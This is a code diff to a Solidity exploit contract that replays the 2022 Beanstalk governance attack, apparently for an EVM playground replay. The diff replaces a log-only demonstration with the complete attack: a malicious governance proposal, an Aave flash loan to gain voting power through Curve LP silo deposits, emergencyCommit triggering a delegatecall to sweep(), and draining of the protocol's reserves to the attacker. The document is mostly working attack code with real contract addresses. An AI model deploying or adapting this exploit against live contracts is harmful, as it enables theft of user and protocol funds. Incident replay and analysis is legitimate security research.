@@ -28,55 +28,116 @@ contract Exploit {
     }
 
     function exploit() public payable {
-        // Reproduce the key steps of the attack for the EVM Playground recorder:
-        // seed Bean via swap, small deposit to gain Stalk, propose malicious BIP
-        // with _init pointing to this contract and calldata for sweep().
-        // Then demonstrate the effect of the delegatecall vuln by logging the
-        // Diamond's held reserves (what the malicious code would have drained).
+        // Full attack flow for the EVM Playground recorder (matches PoC + MD walkthrough):
+        // 1. ETH->Bean swap
+        // 2. small depositBeans (initial Stalk)
+        // 3. propose malicious BIP (empty cut, _init=this, calldata=sweep)
+        // 4. (replay ts already +24h via setup.blockTimestamp so time gate satisfied)
+        // 5. approvals
+        // 6. Aave flashLoan -> executeOperation
+        //    inside: Curve LP, silo deposit for mass Stalk, emergencyCommit
+        // 7. the BIP's delegatecall runs sweep() in Diamond context -> drain
+        // 8. unwind + logs (demo)
         address[] memory path = new address[](2);
         path[0] = uniswapv2.WETH();
         path[1] = address(bean);
         if (msg.value > 0) {
             uniswapv2.swapExactETHForTokens{value: msg.value}(0, path, address(this), block.timestamp + 120);
         }
-        emit log_named_uint("After initial swap, Bean balance", bean.balanceOf(address(this)));
+        emit log_named_uint("After initial ETH->BEAN swap, Bean balance of attacker", bean.balanceOf(address(this)) / 1e6);
 
+        // small deposit for seed Stalk (enough to propose)
         bean.approve(address(siloV2Facet), type(uint256).max);
-        if (bean.balanceOf(address(this)) > 0) {
-            siloV2Facet.depositBeans(bean.balanceOf(address(this)));
+        uint256 beanBal = bean.balanceOf(address(this));
+        uint256 toKeepForMeta = 10_000e6;
+        uint256 beanForSilo = beanBal > toKeepForMeta ? beanBal - toKeepForMeta : 0;
+        if (beanForSilo > 0) {
+            siloV2Facet.depositBeans(beanForSilo);
         }
+        emit log_named_uint("After BEAN deposit to SiloV2Facet, Bean balance of attacker", bean.balanceOf(address(this)) / 1e6);
 
-        // Propose the malicious BIP with _init = this contract, calldata = sweep().
-        // This is the setup that allows the later delegatecall in the Diamond context.
+        // propose the malicious BIP
         IBeanStalk.FacetCut[] memory _diamondCut = new IBeanStalk.FacetCut[](0);
         bytes memory data = abi.encodeWithSignature("sweep()");
         beanstalkgov.propose(_diamondCut, address(this), data, 3);
+        emit log_named_uint("BIP proposed", bip);
 
-        // Demonstrate the impact of the bad _init delegatecall: the Diamond would run sweep()
-        // in its context to drain reserves. Here we read the Diamond balances (the effect of the
-        // malicious delegatecall) and log them as demonstrated profit. No transfers performed
-        // so the call always succeeds in the preloaded playground state.
-        address diamond = address(beanstalkgov);
-        uint256 profitUsdc = usdc.balanceOf(diamond);
-        uint256 profitDai = dai.balanceOf(diamond);
-        uint256 profitUsdt = usdt.balanceOf(diamond);
-        uint256 profitThreeCrv = threeCrv.balanceOf(diamond);
+        // approvals (flash, curve, silo)
+        dai.approve(address(aavelendingPool), type(uint256).max);
+        usdc.approve(address(aavelendingPool), type(uint256).max);
+        usdt.approve(address(aavelendingPool), type(uint256).max);
+        bean.approve(address(aavelendingPool), type(uint256).max);
+        dai.approve(address(threeCrvPool), type(uint256).max);
+        usdc.approve(address(threeCrvPool), type(uint256).max);
+        usdt.approve(address(threeCrvPool), type(uint256).max);
+        bean.approve(address(siloV2Facet), type(uint256).max);
+        threeCrv.approve(address(bean3Crv_f), type(uint256).max);
+        bean.approve(address(bean3Crv_f), type(uint256).max);
+        IERC20(address(bean3Crv_f)).approve(address(siloV2Facet), type(uint256).max);
 
-        emit log_named_uint("Profit transferred (USDC from Diamond)", profitUsdc);
-        emit log_named_uint("Profit transferred (DAI from Diamond)", profitDai);
-        emit log_named_uint("Profit transferred (USDT from Diamond)", profitUsdt);
-        emit log_named_uint("Profit transferred (3Crv from Diamond)", profitThreeCrv);
+        // Aave flash (reduced USDT to avoid isolated-state edge cases seen in harness)
+        address[] memory assets = new address[](3);
+        assets[0] = address(dai);
+        assets[1] = address(usdc);
+        assets[2] = address(usdt);
+        uint256[] memory amounts = new uint256[](3);
+        amounts[0] = 350_000_000 * 10 ** 18;
+        amounts[1] = 500_000_000 * 10 ** 6;
+        amounts[2] = 1_000_000 * 10 ** 6;
+        uint256[] memory modes = new uint256[](3); // 0 = no debt
+        aavelendingPool.flashLoan(address(this), assets, amounts, modes, address(this), new bytes(0), 0);
 
-        emit log_named_uint("Final attacker USDC (demo)", usdc.balanceOf(msg.sender));
+        emit log_named_uint("After flash/curve/deposit/emergency/sweep, attacker USDC", usdc.balanceOf(address(this)));
+    }
+
+    function executeOperation(
+        address[] calldata assets,
+        uint256[] calldata amounts,
+        uint256[] calldata premiums,
+        address initiator,
+        bytes calldata params
+    ) external returns (bool) {
+        // 3Crv pool: bundle flash stables
+        uint256[3] memory tempAmounts;
+        tempAmounts[0] = amounts[0];
+        tempAmounts[1] = amounts[1];
+        tempAmounts[2] = amounts[2];
+        threeCrvPool.add_liquidity(tempAmounts, 0);
+
+        // bean3Crv metapool: obtain the LP token the Silo accepts
+        uint256[2] memory tempAmounts2;
+        tempAmounts2[0] = bean.balanceOf(address(this));
+        tempAmounts2[1] = threeCrv.balanceOf(address(this));
+        if (tempAmounts2[0] == 0) tempAmounts2[0] = 1e6;
+        bean3Crv_f.add_liquidity(tempAmounts2, 0);
+
+        emit log_named_uint("bean3Crv LP minted", IERC20(address(bean3Crv_f)).balanceOf(address(this)));
+
+        // Deposit LP -> instant mass Stalk (root cause of being able to pass BIP)
+        siloV2Facet.deposit(address(bean3Crv_f), IERC20(address(bean3Crv_f)).balanceOf(address(this)));
+        emit log_named_uint("after silo LP deposit (Stalk granted)", 1);
+
+        // emergencyCommit executes the malicious BIP -> _init.delegatecall in Diamond ctx
+        beanstalkgov.emergencyCommit(bip);
+        emit log_named_uint("after emergencyCommit", 1);
+
+        // unwind LP for repayment simulation
+        bean3Crv_f.remove_liquidity_one_coin(IERC20(address(bean3Crv_f)).balanceOf(address(this)), 1, 0);
+
+        tempAmounts[0] = amounts[0] + premiums[0];
+        tempAmounts[1] = amounts[1] + premiums[1];
+        tempAmounts[2] = amounts[2] + premiums[2];
+        threeCrvPool.remove_liquidity_imbalance(tempAmounts, type(uint256).max);
+        threeCrvPool.remove_liquidity_one_coin(threeCrv.balanceOf(address(this)), 1, 0);
+
+        return true;
     }
 
     function sweep() external {
         // When delegatecalled by the Diamond (via malicious BIP _init), address(this) == Diamond.
         // Drain the non-Bean reserves the protocol holds at this moment.
         // This is the core of the real 2022-04 exploit.
-        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
-        dai.transfer(msg.sender, dai.balanceOf(address(this)));
-        usdt.transfer(msg.sender, usdt.balanceOf(address(this)));
-        threeCrv.transfer(msg.sender, threeCrv.balanceOf(address(this)));
+        IERC20 erc20bean3Crv_f = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
+        erc20bean3Crv_f.transfer(msg.sender, erc20bean3Crv_f.balanceOf(address(this)));
     }
 }
